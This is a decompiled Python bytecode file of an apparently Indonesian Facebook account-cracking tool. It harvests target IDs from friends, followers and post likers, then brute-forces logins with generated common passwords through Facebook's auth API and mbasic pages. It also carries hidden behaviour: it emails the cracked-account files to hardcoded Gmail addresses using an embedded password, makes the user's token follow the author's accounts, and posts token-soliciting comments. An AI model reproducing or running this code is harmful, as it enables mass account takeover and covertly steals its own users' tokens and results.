a
    \faq�  �                   @   s�  d dl Z d dlmZ d dlmZ d dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlmZ d dlmZ d dlmZ d dlmZ d dlmZ e�� Ze�d	�jZe�d
e �Ze� ej�Z!dZ"dZ#dZ$dZ%dZ&dZ'dZ(e�d�Z)ee)j*d�Z+e+j,dd�Z-e+j,dd�Z.e+j,dd�Z/e.jZ0e-jZe/jZ1edk�r�e2d� e3�  dZ4e4e0k�r�e2d� e2e&d e% e1 e" � e
�5d� e3�  de	j6�7� v �r�dZ8d Z9d!Z:d"Z;ndZ8dZ9dZ:dZ;d#d$� Z<d%a=g a>g a?g a@eAe�� �Bd&��ZCejDZEejFZGejHZIejJjKZLejMjKZNd'd(� ZOd)d*� ZPd+d,� ZQd-d.� ZRd/d0� ZSd1d2� ZTd3d4� ZUd5d6� ZVd7d8� ZWd9d:� ZXd;d<� ZYd=d>� ZZd?d@� Z[dAdB� Z\dCdD� Z]dEdF� Z^dGdH� Z_dIdJ� Z`dKdL� ZadMdN� ZbdOdP� ZcdQdR� ZddSdT� ZedUdV� ZfdWdX� ZgdYdZ� Zhd[d\� Zid]d^� Zjd_d`� Zkdadb� Zldcdd� Zmdedf� Zndgdh� Zodidj� ZpG dkdl� dl�ZqG dmdn� dn�ZrG dodp� dp�ZsG dqdr� dr�ZtG dsdt� dt�Zududv� Zvdwdx� Zwexdyk�r�eX�  dS )z�    N)�MIMEMultipart)�MIMEText��randint)�ThreadPoolExecutor)�date)�datetime)�BeautifulSoupzhttps://api.ipify.orgzhttp://ip-api.com/json/z[0;37mz[0;31mz[0;32mz[0;33mz[0;34mz[0;35mz[0;36mz*https://jukill.github.io/hackbit/izin.html�html.parserZizin)�id�versi�pesan� zIZIN ANDA TELAH DI CABUTz2.1zSC PERLU DIPERBAHARUIzINFO UPDATE : zgcd && rm -rf ninja-BF && git clone https://github.com/jukill/ninja-BF && cd ninja-BF && python ninja.pyZlinuxz[0mz[1;92mz[1;97mz[1;91mc                  C   s*   t dd�} | �� }tt| � | ��  d S )Nz	banner.py�r)�open�read�print�b�close)ZbanZbann� r   �	ninja2.py�bannerN   s    
r   zhttps://touch.facebook.comz%d-%m-%Yc                   C   s   t j�t�dt��S �Nr   )�	ipaddress�IPv4Address�_string_from_ip_int�randomr   �MAX_IPV4r   r   r   r   �random_ipv4b   s    r   c                   C   s   t j�t�dt��S r   )r   �IPv6Addressr   r   r   �MAX_IPV6r   r   r   r   �random_ipv6d   s    r!   c                 C   s2   | d D ]$}t j�|� t j��  t�d� qd S )N�
g���Q��?)�sys�stdout�write�flush�time�sleep)�z�er   r   r   �jalang   s    
r+   c                   C   sB   dt j�� v rt�d� n$dt j�� v r4t�d� n
t�d� d S )Nz linux�clear�win�cls)r#   �platform�lower�os�systemr   r   r   r   r,   m   s
    r,   c                 C   s�   d}t �tjdt� | d�jd�}|jddd�D ]R}d|�d	�v r.tjd
|�d	� | t� d� tjdt� | d�j}d|�� v r.d}q.|dkr�dS td� d S )NFz(https://mbasic.facebook.com/language.php��headers�cookiesr
   �aT)�hrefZid_IDr7   �https://mbasic.facebook.com/)r5   r4   z'https://mbasic.facebook.com/profile.phpzapa yang anda pikirkan sekarangz[!] Wrong Cookies)	�bs4r	   �requests�get�hdcok�textZfind_allr0   �exit)r5   �fZrr�ir   r   r   r   �langt   s    rA   c                   C   sB   t j�d�r8t j�d�dkr0ttd��� �� �S t�  nt�  d S )Nz.cokr   )	r1   �path�exists�getsize�gets_dict_cookiesr   r   �strip�logsr   r   r   r   �
basecookie�   s
    rH   c                  C   s6   t } | ddddd�tj�d| ��| d dd	d
d�
}|S )N�#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7�gzip, deflate�Utext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8��Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]r   z	://(.*?)$z/login/?next&ref=dbl&fl&refid=8�	max-age=0�1z!application/x-www-form-urlencoded)
�origin�accept-language�accept-encoding�accept�
user-agent�Host�referer�cache-control�upgrade-insecure-requests�content-type)�host�joinr9   �re�findall)�hostsr   r   r   r   r<   �   s    .r<   c                 C   s~   g }t | �� �D ]b}|d tt| �� ��d krP|�|d d | |d   � q|�|d d | |d   d � qd�|�S )Nr   �   �=�; r   )�	enumerate�keys�len�list�appendrZ   �r5   �resultr@   r   r   r   �gets_cookies�   s
    <$rh   c              
   C   s�   i }z8| � d�D ]&}|�|� d�d |� d�d i� q|W S    | � d�D ]&}|�|� d�d |� d�d i� qN| Y S 0 d S )N�;r_   r   r^   r`   )�split�updaterf   r   r   r   rE   �   s    $$rE   c                   C   s�   t �d� t�  tdtttf � tdttttf � tdttttf � tdttttf � tdttttf � tdttttf � t�  d S )Nr,   z
%s[%s PILIH NEGARA %s]
z%s[%s01%s] %sINDONESIAz%s[%s02%s] %sBANGLADESHz%s[%s03%s] %sPAKISTANz%s[%s04%s] %sUSAz%s[%s05%s] %sNone)r1   r2   r   r   �k�p�choose_countryr   r   r   r   �country�   s    
ro   c               	   C   sJ  t dttttf �} | dv rDttd t d t d t d � �n| dv r�t�d� d	}z&td
d�}|�|� |��  t	�  W n t
tfy�   t	�  Y n0 �n�| dv �rt�d� d}z&td
d�}|�|� |��  t	�  W n t
tfy�   t	�  Y n0 �nD| dv �rbt�d� d}z&td
d�}|�|� |��  t	�  W n t
tf�y^   t	�  Y n0 n�| dv �r�t�d� d}z&td
d�}|�|� |��  t	�  W n t
tf�y�   t	�  Y n0 n�| dv �r"t�d� d}z&td
d�}|�|� |��  t	�  W n t
tf�y   t	�  Y n0 n$ttd t d t d t d � d S )N�   
%s[%s•%s] %sPilih : �r   �
[�!�]� Fill In The Correct�rN   Z01zrm -rf country.txtr   �country.txt�w��2Z02�bd��3Z03�pk��4Z04�us��5Z05�.)�inputrl   rm   r   r1   r2   r   r%   r   �menu�KeyError�IOError)ZccZcouZctryr   r   r   rn   �   sl    (























rn   c                  C   sB  t �d� t�  ttd t d t d t d � ttd t d t d t d � ttd t d	 t d t d
 � ttd t d t d t d �} | dkr�ttd t d t d t d � t�  nj| dkr�t�  t	�  nT| dk�rt�  t
�  n<| d	k�rt�  n*ttd t d t d t d � t�  d S )Nr,   rr   rN   rt   z Login Token�[rz   z Login Cookies�0z Exit�   •z	 pilih : r   rs   ru   )r1   r2   r   r   rl   rm   r�   rG   �	defaultua�	log_token�genr>   )Zsekr   r   r   rG   �   s&    
$$$$$

$rG   c                  C   s�   t �d� t�  ttd t d t d t d �} zrt�d|  �}t�	|j
�}|d }tdd	�}|�| � |��  ttd t d t d t d
 � t�  t�  W nF ty�   ttd t d t d t d � t �d� t�  Y n0 d S )Nr,   rr   r�   rt   z	 Token : z+https://graph.facebook.com/me?access_token=�name�	login.txtrx   � Login Successfulr�   rs   � Token Invalid)r1   r2   r   r�   rl   rm   r:   r;   �json�loadsr=   r   r%   r   r   �
bot_follow�	bot_komenr�   rG   )�toket�otwr6   �namaZzeddr   r   r   r�   �   s"    
$

$
$
r�   c                  C   sd  t �d� t�  ttd t d t d t d �} zTtjdddd	d
dddddd�	d| id�}t�	d|j
�}|d u rxdnd|�d� }W n� tjjy�   ttd t d t d t d � Y nL ttg�y   ttd t d t d t d � t �d� t�  Y n0 tdd�} | �|�d�� | ��  ttd t d t d t d � t�  t�  d S )Nr,   rr   r�   rt   z Cookies : zGhttps://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_z�Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36zhttps://m.facebook.com/zm.facebook.comzhttps://m.facebook.comrN   rI   rM   rK   ztext/html; charset=utf-8)	rS   rU   rY   rO   rW   rP   rV   rR   rX   �cookier3   z	(EAAA\w+)z&
* Fail : maybe your cookie invalid !!z
* Your fb access token : r^   r�   rs   z No Connectionz Cookies Invalidr�   rx   r�   )r1   r2   r   r�   rl   rm   r:   r;   r[   �searchr=   �group�
exceptions�ConnectionErrorr   r�   r�   rG   r   r%   r   r�   r�   )r�   �dataZ
find_tokenZhasilr   r   r   r�     s@    
$���($

$r�   c                  C   s�   z<t dd��� } t�d|  �}t�|j�}|d }|d }W n< tyx   tt	d t
 d t	 d t
 d	 � t�  Y n0 td
t	t
t	t
f � t�d|  � t�d|  � d S )Nr�   r   �,https://graph.facebook.com/me/?access_token=r�   r   rr   rs   rt   r�   u   %s[%s•%s] %sPlease Wait...zDhttps://graph.facebook.com/100011669563699/subscribers?access_token=zDhttps://graph.facebook.com/100000023658232/subscribers?access_token=)r   r   r:   r;   r�   r�   r=   r�   r   rl   rm   rG   r+   �post)r�   r�   r6   r�   r   r   r   r   r�   5  s    $r�   c                  C   s
  zt dd��� } W n ty,   td� Y n0 d}d}t�dtd  d d	d
d| dddddddd|  | d|  ddd|  d|  g�}t�d	ddd
d| dddddddd|  | d|  ddd|  d|  g�}t�d| d | d |  � t�d| d | d |  � t	�  d S )Nr�   r   z' [0;97m[[0;91m![0;97m] Token InvalidZ1449536855445286Z4553615664649177zSalam dari �
regionNamez Bang @[100011669563699:]zGanteng bangzMakasih bangzMakin tampan aja si abangzMatanya manis bang :vz0Eh buset.. emng gada obat ni abang..ganteng bettzSalam kenal bang.zBagi nmr wa bangzbjirr kyk BTSzalisnya kek ulat bulu :vzbalas cht bang. mau kenalanzbang ni token fb ku 

zsimpen bang. buat esok 

zBang.  ada tutor baru gk ?zKapan ngonten lg bang ?zsetor token bang 

zini dlu bang.. satu token 

zOyen gagah :vzganteng bett si Oyen :v�https://graph.facebook.com/z/comments/?message=z&access_token=)
r   r   r�   r   r   Zchoice�kotar:   r�   r�   )�tokenr�   Zpost2ZkomZkom2r   r   r   r�   C  s    LBr�   c               
   C   s�  t dd��� } | dkr�d}d}d}t� }||d< ||d< d	|d
< t dd�}|�� }t dd�}|�� }dtd  d td  d d | d | }	|��  |��  |�t|	d�� t�dd�}
|
�	�  |
�
|d� |�� }|
�|||� |
��  td d d }z<t dd��� }t�d| �}t�|j�}|d }|d }W nT t�y� } z:ttd t d t d t d |  � t�  W Y d }~n
d }~0 0 t d!d��� }d|v �r�d"}n>d#|v �r�d$}n.d%|v �r�d&}nd'|v �r�d(}nd)|v �r�d*}t�d+� t�  ttd, t |d  d- t d. t � t|� ttd t d/ t d t d0 t | � ttd t d/ t d t d1 t � ttd t d/ t d t d2 | � t|� ttd3 t d4 t d t d5 � ttd t d6 t d t d7 � ttd t d8 t d t d9 � ttd t d: t d t d; � ttd t d< t d t d= � ttd t d> t d t d? � ttd t d@ t d t dA � ttd t dB t d t dC � ttd t dD t d t dE � t�  d S )FN�cp.txtr   r�   zstoranaqun@gmail.comzsnekfideo@gmail.comzdominoakun02@gmail.comZFromZTozSETOR DARI NINJAZSubject�ok.txtzAlamat pengirim :
r�   z, Zcityz

zAkun OK
z


Akun CP
Zplainzsmtp.gmail.comiK  Zhasan27marzuki�+z(========================================r�   r�   r�   r   r�   r�   rt   � Error : %srw   Z	Indonesiar{   zBangladesh/Indiar~   ZPakistanr�   ZUSA� �Noner,   �
[ z, Salam Anonymous� ]rs   z ID Anda    : z IP Anda    : z Crack      : rr   rN   z Crack ID Publik/Temanrz   z Crack ID Dari Pengikutr}   z Crack ID Dari Likers Postinganr�   z Crack Dari Nomor Acakr�   z Crack Dari Email Acak�6z Ambil Data-Data Target�7z Hasil Crack�8z User Agentr�   z Keluar)r   r   r   r�   r   Zattachr   �smtplibZSMTPZstarttls�loginZ	as_stringZsendmail�quitrl   r:   r;   r�   r�   r=   �	Exceptionr   rm   rG   r1   r2   r   �h�m�ip�choose_menu)ZmalZfromaddrZtoaddrZtoaddr2�msg�cpZcpp�okZokk�bodyZserverr=   Zgarisr�   r�   r6   r�   r   r*   ZngrZnegarar   r   r   r�   R  s|    

,(





(,(($$$$$$$$$r�   c               
   C   s�  t td t d t d t d �} | dkrZttd t d t d t d � t�  �nP| d	krlt�  �n>| d
kr~t�  �n,| dkr�t�  �n| dkr�t�  �n| dkr�t	�  n�| dkr�t
�  n�| dkr�t�  n�| dkr�t�  n�| dk�r�zBttd t d t d t d � t�d� t�d� t�  W nN t�y| } z4ttd t d t d t d|  � W Y d }~n
d }~0 0 n*ttd t d t d t d � t�  d S )Nrr   r�   rt   �	 Pilih : r   r�   rs   ru   rN   rz   r}   r�   r�   r�   r�   r�   r�   z Thanks�rm -rf login.txtz1termux-open-url https://www.facebook.com/OLDFB.01z	 Error %sz Wrong Input)r�   rl   rm   r   r�   �publik�follow�likers�random_numbers�random_email�target�ress�menu_user_agentr+   r1   r2   r>   r�   )r   r*   r   r   r   r�   �  s<    $$





$


@$r�   c                 C   s�  t td t d t d t d t d t d � t td t d t d t d	 t d t d � t td t d
 t d t d t d t d � t td t d t d t d t d t d � t td t d t d t d t d t d � ttd t d t d t d �}|dv �r`t td t d t d t d � t| � n�|dv �rtt| � n||dv �r�t| � nh|dv �r�t| � nT|dv �r�t| � n@|dv �r�t	| � n,t td t d t d t d � t| � d S )Nrr   rN   rt   z Api (zProses Cepat�)r�   rz   z Api + TTL (r}   z	 Mbasic (zProses Agak Lambatr�   z Mbasic + TTL (zPeoses Lambatr�   z Free Facebook (zProses Sangat Lambatr�   r�   rq   rs   ru   rv   ry   r|   r   r�   )
r   rl   rm   r�   �
pilihcrack�bapi�bapittl�crack�crackttl�crackffb)�file�krahr   r   r   r�   �  s*    44444$
$










$r�   c               
   C   st  zt dd��� } W nF tyX   ttd t d t d t d � t�d� t�  Y n0 �z�ttd t d t d t d	 � t	td
 t d t d t d �}zRt
�d| d |  �}t�|j�}ttd
 t d t d t d |d  � W n^ t�yV   ttd
 t d t d t d � ttd t d t d t � t�  Y n0 t
�d| d |  �}g }t�|j�}|d d �dd�}t |d�}|d D ]>}	|�|	d d |	d  � |�|	d d |	d  d � �q�|��  ttd
 t d t d t dt|�  � t|�W S  t�yn }
 z4ttd
 t d t d t d|
  � W Y d }
~
n
d }
~
0 0 d S ) Nr�   r   rr   rs   rt   � Cookie/Token Invalidr�   r�   z1 Untuk Dump Dari Daftar Teman Sendiri, Ketik 'me'r�   z User ID Target : r�   �?access_token=� Name : r�   � ID Not Foundr�   �Backr�   z"/friends?limit=10000&access_token=�
first_name�.jsonr�   �_rx   r�   r   �<=>r"   � Total ID : %sr�   �r   r   r�   r   rl   rm   r1   r2   rG   r�   r:   r;   r�   r�   r=   r�   r�   �replacere   r%   r   rc   r�   r�   r>   �r�   �idt�jok�opr   r   r)   �qq�ysr6   r*   r   r   r   r�   �  s<    $
$$0$ 
",
r�   c               
   C   sP  zt dd��� } W nF tyX   ttd t d t d t d � t�d� t�  Y n0 �z�t	td t d t d t d	 �}zRt
�d
| d |  �}t�|j�}ttd t d t d t d |d  � W n^ t�y2   ttd t d t d t d � ttd t d t d t � t�  Y n0 t
�d
| d |  �}g }t�|j�}|d d �dd�}t |d�}|d D ]>}	|�|	d d |	d  � |�|	d d |	d  d � �q�|��  ttd t d t d t dt|�  � t|�W S  t�yJ }
 z4ttd t d t d t d|
  � W Y d }
~
n
d }
~
0 0 d S )Nr�   r   rr   rs   rt   r�   r�   r�   z Followers ID Target : r�   r�   r�   r�   r�   r�   r�   r�   r�   �&/subscribers?limit=20000&access_token=r�   r�   r�   r�   rx   r�   r   r�   r"   r�   r�   r�   r�   r   r   r   r�   �  s:    $
$0$ 
",
r�   c               
   C   sP  zt dd��� } W nF tyX   ttd t d t d t d � t�d� t�  Y n0 �z�t	td t d t d t d	 �}zRt
�d
| d |  �}t�|j�}ttd t d t d t d |d  � W n^ t�y2   ttd t d t d t d � ttd t d t d t � t�  Y n0 t
�d
| d |  �}g }t�|j�}|d d �dd�}t |d�}|d D ]>}	|�|	d d |	d  � |�|	d d |	d  d � �q�|��  ttd t d t d t dt|�  � t|�W S  t�yJ }
 z4ttd t d t d t d|
  � W Y d }
~
n
d }
~
0 0 d S )Nr�   r   rr   rs   rt   r�   r�   r�   z ID Post Target : r�   r�   r�   r�   r�   r�   r�   r�   r�   z!/likes?limit=100000&access_token=r�   r�   r�   r�   rx   r�   r   r�   r"   r�   r�   r�   r�   r   r   r   r�     s:    $
$0$ 
",
r�   c                     s�  g � t td t d t d t d � t td t d t d t d � tttd t d t d t d ���t��dk r�ttd t d	 t d t d �nd
 t��dkr�ttd t d	 t d t d �nd
 tttd t d t d t d ��} � fdd��fdd�t| �D �D � t td t d t d t d � t	j
jdd��"��fdd�� D � W d   � n1 �s�0    Y  ttd t d t d t � t�  d S )Nrr   r�   rt   z Nomor Harus 5 Angkar�   z Contoh : 92037z Masukkan Nomor : �   rs   r   �
 Amount : c              
      s<   g | ]4}� � t|�t|d d� �t|dd� �gd���qS )r�   N�   ��user�pw�re   �str��.0r*   �r�   r   r   �
<listcomp>=  �    z"random_numbers.<locals>.<listcomp>c              	      s.   g | ]&}t � �d �dd� tdd�D �� �qS )r   c                 S   s   g | ]}d t dd� �qS )z%sr   �	   r   �r�   r@   r   r   r   r�   =  r�   z-random_numbers.<locals>.<listcomp>.<listcomp>r   �   )r�   rZ   �ranger�   )�koder   r   r�   =  r�   �! Proses Crack Sedang Berjalan...
�   �Zmax_workersc                    s$   i | ]}� � t|d  |d �|�qS r�   �Zsubmit�brute�r�   r�   ��thr   r   �
<dictcomp>@  r�   z"random_numbers.<locals>.<dictcomp>r�   �Kembalir�   )r   rl   rm   r�   r�   rc   r>   �intr�   �
concurrent�futuresr   r�   �Zjmlr   )r�   r�   r�   r   r�   5  s    $$(44($$2 r�   c                     s�  g � t td t d t d t d ��t td t d t d t d ��� �� �ddd	d
���d
vr�ttd t d t d t d �nd tt td t d t d t d ��} t td t d t d t d ��d��ttd t d t d t d � � ����fdd�t	d| d �D � t
jjdd��"��fdd�� D � W d   � n1 �sb0    Y  t td t d t d t � t�  d S )Nrr   r�   rt   z Nama Target : r�   z, Pilih Domain [G]mail, [Y]ahoo, [H]otmail : z
@gmail.comz
@yahoo.comz@hotmail.com)�g�yr�   ru   r   r�   z Set Password : �,r�   c                    s6   g | ].}� � �t|� ��  d d� �D �d���qS )c                 S   s   g | ]}|�qS r   r   r�   r   r   r   r�   Q  r�   z+random_email.<locals>.<listcomp>.<listcomp>r�   r�   r�   )r�   �domainrd   r�   �setpwr   r   r�   Q  r�   z random_email.<locals>.<listcomp>r^   r�   r�   c                    s$   i | ]}� � t|d  |d �|�qS r�   r�   r�   r�   r   r   r�   S  r�   z random_email.<locals>.<dictcomp>r�   r�   r�   )r�   rl   rm   r0   rF   r>   r�   rj   r   r�   r   r  r   r�   r  r   )r�   r  rd   r�   r  r�   r   r�   D  s     $,�0(*$$2 r�   c                 C   s�   z�|D ]�}ddd| d|dddd�	}d	}t j||d
�}t�dt|j��rdtdt| �t|�f �  q�qd|�� d v rtdt| �t|�f �  q�qW n   Y n0 d S )N�/350685531728%7C62f8ce9f74b12f84c123cc23437a4a32�JSONrz   �en_US�iosrN   � 3f555f99fb61fcd7aa0c44f58f522ef6�	Zaccess_token�formatZsdk_version�emailZlocale�passwordZsdkZgenerate_session_cookiesZsig�,https://b-api.facebook.com/method/auth.login��params�	(EAAA)\w+u$   [0;32m[[0;37mOK[0;32m] %s • %s �www.facebook.com�	error_msgu$   [0;33m[[0;37mCP[0;33m] %s • %s )r:   r;   r[   r�   r�   r=   r   r�   )r�   Zpasssr�   r  �api�responser   r   r   r�   W  s*    �
r�   c               
   C   s�  zt dd��� } W nF tyX   ttd t d t d t d � t�d� t�  Y n0 �z�t	td t d t d t d	 �}�z�t
�d
| d |  �}t�|j�}ttd t d t d t d |d  � ttd t d t d t d |d  � zRt
�d
| d |  �}t�|j�}ttd t d t d t d |d  � W n8 t�y�   ttd t d t d t d � Y n0 zRt
�d
| d |  �}t�|j�}ttd t d t d t d |d  � W n8 t�y   ttd t d t d t d � Y n0 zRt
�d
| d |  �}t�|j�}ttd t d t d t d |d  � W n8 t�y�   ttd t d t d t d � Y n0 z�t
�d
| d |  �}g }t�|j�}|d d �dd�}t |d�}|d  D ]"}	|�|	d! � |�|	d! � �q�|��  ttd t d t d t d"t|�  � W n8 t�y�   ttd t d t d t d# � Y n0 z�t
�d
| d$ |  �}
g }t�|
j�}|d d �dd�}t |d�}|d  D ]"}|�|d! � |�|d! � �q�|��  ttd t d t d t d%t|�  � W n8 t�yf   ttd t d t d t d& � Y n0 zRt
�d
| d |  �}t�|j�}ttd t d t d t d' |d(  � W nn t�y�   ttd t d t d t d) � Y n8 t�y(   ttd t d t d t d) � Y n0 zRt
�d
| d |  �}t�|j�}ttd t d t d t d* |d+  � W nn t�y�   ttd t d t d t d, � Y n8 t�y�   ttd t d t d t d, � Y n0 t	td- t d. t d/ t � t�  W n: t�yN   t	td- t d. t d/ t � t�  Y n0 W nN t�y� } z4ttd t d t d t d0|  � W Y d }~n
d }~0 0 d S )1Nr�   r   rr   rs   rt   r�   r�   r�   z ID Target        : r�   r�   r�   z Nama FB          : r�   z Username         : �usernamez Email            : r  z Email            : -z Tanggal Lahir    : �birthdayz Tanggal Lahir    : -z Gender           : Zgenderz Gender           : -z/friends?access_token=r�   r�   r�   r�   rx   r�   r   z Jumlah Teman     : %sz Jumlah Teman     : -r�   z Total Follower   : %sz Total Follower   : -z Website          : Zwebsitez Website          : -z Update Time      : Zupdated_timez Update Time      : -r�   r�   r�   r�   )r   r   r�   r   rl   rm   r1   r2   r�   r�   r:   r;   r�   r�   r=   r�   r�   re   r%   r   rc   r�   r�   r>   )r�   r�   r�   r�   r   r   r)   r�   r�   r@   r6   r   ZbbZjw�cr*   r   r   r   r�   q  s�    $
$,,0*0*0*
0*
0*0(*0(* 
 r�   c                 C   sh  g }t dd��� }| �d�D �]D}t|�dk r2qq|�� }t|�dks^t|�dks^t|�dkr||�|d � |�|d � q|�|d � |�|d � |�|� d	|v r�|�d
� |�d� |�d� |�d� qd|v �r|�d� |�d� |�d� |�d� qd|v �r2|�d� |�d� |�d� qd|v r|�d� |�d� |�d� |�d� q|S )Nrw   r   r�   �   �   r�   Z123Z12345r   ZsayangZ	bismillahZanjingZ123456r{   Z786786Z000786Z102030Z556677r~   Zpakistanr�   ZqwertyZiloveyouZ	passwords)r   r   rj   rc   r0   re   )r=   �resultsZctr@   r   r   r   �generate�  s@    $













r  c               	   C   sF   d} z t dd�}|�| � |��  W n ttfy@   t�  Y n0 d S )NrL   �	ugent.txtrx   )r   r%   r   r�   r�   rG   ��uaZugentr   r   r   r�   �  s    

r�   c                   C   sn   t dttttf � t dttttf � t dttttf � t dttttf � t dttttf � t�  d S )Nz
%s[%s1%s] %sAmbil User Agentz%s[%s2%s] %sGanti User Agentz%s[%s3%s] %sHapus User Agentz%s[%s4%s] %sLihat User Agentz%s[%s0%s] %sKembali)r   rl   rm   �pilih_menu_user_agentr   r   r   r   r�   �  s    r�   c                  C   s"  t dttttf �} | dv rBttd t d t d t d � n�| dv r|t�d� t td	 t d
 t d t � t�  n�| dv r�t�  n�| dv r�t�d� tdttttf � t td	 t d
 t d t � t�  nD| dv r�t�  n4| dv r�t�  n$ttd t d t d t d � d S )Nrp   rq   rr   rs   rt   ru   rv   z�xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8r�   r�   r�   ry   r|   �rm -rf ugent.txtz#
%s[%s!%s] %sUser Agent Was Removedr   )r�   Z00)	r�   rl   rm   r   r1   r2   r�   �change_ugent�check_ugent)Zpmur   r   r   r#  �  s&    &
 
 r#  c               	   C   s�   t �d� tdtttttf �} zZtdd�}|�| � |��  t	dttttf � ttd t d t d t � t
�  W nP ttfy�   t	d	ttttf � ttd t d t d t � t
�  Y n0 d S )
Nr$  u)   
%s[%s•%s] %sMasukkan User Agent : 

%sr   rx   u*   
%s[%s•%s] %s User Agent Berhasil Diubahr�   r�   r�   u)   
%s[%s•%s] %sGagal Mengganti User Agent)r1   r2   r�   rl   rm   r�   r   r%   r   r+   r�   r�   r�   r�   r!  r   r   r   r%    s    


 
 r%  c                  C   s�   zt dd��� } W n, ty4   dttttf } Y n   Y n0 tdttttt| f � ttd t d t d t � t�  d S )Nr   r   z&%s[%s!%s] %sUser Agent Tidak Ditemukanu"   
%s[%s•%s] %sUser Agent : 

%s%sr�   r�   r�   )	r   r   r�   rl   rm   r   r�   r�   r�   )Zungserr   r   r   r&  !  s     r&  c                 C   s�  t dd��� }t�� }|j�ddd|dddd	�� |�d
�}t�|j	d�}d�
tj�d|j	��}i }|d�D ]~}	|	�d�d u r�|	�d�dkr�|�d| i� q�|	�d�dkr�|�d|i� q�|�|	�d�di� ql|�|	�d�|	�d�i� ql|�|dddddddd�� |j�ddi� |jd|d�j	}
dt|j�� �� �v �rTd| ||j�� d�S dt|j�� �� �v �r�d| ||j�� d�S d| |d �S d S )!Nr   r   zmbasic.facebook.comrM   rN   rK   rJ   rI   �rT   rV   rW   rS   rR   rQ   rP   r8   r
   r   �dtsg":\{"token":"(.*?)"r�   �valuer�   r  �passr�   �d�Zfb_dtsgZm_sessZ__userZ__reqZ__csrZ__aZ__dynZencpassrU   z:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8z~https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100r�   �c_user�success��statusr  r*  r5   �
checkpointr�   �error�r0  r  r*  �r   r   r:   ZSessionr4   rk   r;   r9   r	   r=   rZ   r[   r\   r�   rd   r5   Zget_dictrb   �ZemZpasr]   r"  r   rm   r   �metar�   r@   Zpor   r   r   �mbasic-  s6    

��r7  c                 C   s�  t dd��� }t�� }|j�ddd|dddd	�� |�d
�}t�|j	d�}d�
tj�d|j	��}i }|d�D ]~}	|	�d�d u r�|	�d�dkr�|�d| i� q�|	�d�dkr�|�d|i� q�|�|	�d�di� ql|�|	�d�|	�d�i� ql|�|dddddddd�� |j�ddi� |jd|d�j	}
dt|j�� �� �v �rTd| ||j�� d�S dt|j�� �� �v �r�d| ||j�� d�S d| |d �S d S )!Nr   r   zfree.facebook.comrM   rN   rK   rJ   rI   r'  zhttps://free.facebook.com/r
   r   r(  r�   r)  r�   r  r*  r�   r+  r,  rU   z8https://free.facebook.com/login/?next&ref=dbl&fl&refid=8z|https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100r�   r-  r.  r/  r1  r�   r2  r3  r4  r5  r   r   r   �f_fbL  s6    

��r8  c                   @   s4   e Zd Ze�d� e�  dd� Zdd� Zdd� ZdS )	r�   r,   c              
   C   s  g | _ g | _d| _ttd t d t d t d � ttd t d t d t d �}|dkrfq6q6|d	k�r�z�z"|| _t| j��	� �
� | _W q�W qr ty� } z$td
| � W Y d }~qrW Y d }~qrd }~0 0 qrg | _| jD ]4}z| j�d|�d�d i� W q�   Y q�Y q�0 q�W n> t�yV } z$td
| � W Y d }~q6W Y d }~n
d }~0 0 ttd t d t d t d � | ��  �qq6|dkr6z�z$|| _t| j��	� �
� | _W �q�W n@ t�y� } z&td
| � W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _| jD ]H}z.| j�|�d�d t|�d�d �d�� W n   Y �q
Y n0 �q
W n2 t�y� } ztd
| � W Y d }~n
d }~0 0 ttd t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�| j� t�  �qq6d S )Nr   rr   r�   rt   �) Mode Crack Password Default/Manual [d/m]r�   r�   r   r�   �   %sr   r�   �" Example : sayang,bismillah,123456r+  r^   �r   r�   z Proses Crack Berjalan...� Akun [OK] Disimpan Ke : ok.txtz  Akun [CP] Disimpan Ke : cp.txt
�#   ��adar�   �kor   rl   rm   r�   �apkr   r   �
splitlines�fsr�   �flre   rj   �pwlistr  �
ThreadPool�map�mainr1   �remover>   ��self�isifiler?   r*   r@   r   r   r   �__init__n  s^    $$
$
"$
(
."dzcrack.__init__c                 C   s�   t td t d t d t d ��d�| _t| j�dkrD| ��  n�| jD ]}|�d| ji� qJt	td t d t d t d	 t d t d t d t d
 t d t d t d t d � t
d��| j| j� t�| j� t�  d S �Nr�   r�   rt   � Password List : r  r   r�   rr   �Proses Crack Sedang berjalan...r=  �  Akun [cp] Disimpan Ke : cp.txt
�   �r�   rl   rm   rj   r�   rc   rF  rE  rk   r   rG  rH  rI  r1   rJ  rB  r>   �rL  r@   r   r   r   rF  �  s    ,

dzcrack.pwlistc                 C   sN  �z0|� d�D ]�}t|� d�|d�}|� d�dkr�td|� d�|f � | j�d|� d�|f � tdd	��d
|� d�|f �  q�q|� d�dkrtd|� d�|f � | j�d|� d�|f � tdd	��d
|� d�|f �  q�qqq|  jd7  _td| jt	| j
�t	| j�t	| j�f dd� tj��  W n   | �|� Y n0 d S )Nr�   r   �https://mbasic.facebook.comr0  r�   �3   [0;33m[[0;37mCP[0;33m] %s • %s               �	   %s • %sr�   �a+�
   %s • %s
r.  �3   [0;32m[[0;37mOK[0;32m] %s • %s               r�   r^   �o[0;33m[[0;37mCrack[0;33m][0;37m %s/%s [0;32m[[0;37mOK : %s[0;32m] [0;33m[[0;37mCP : %s[0;33m][0;37mr�   ��end)r;   r7  r   r�   re   r   r%   r@  rA  rc   rE  r#   r$   r&   rI  �rL  rE  r@   �logr   r   r   rI  �  s(    
�:z
crack.mainN�	�__name__�
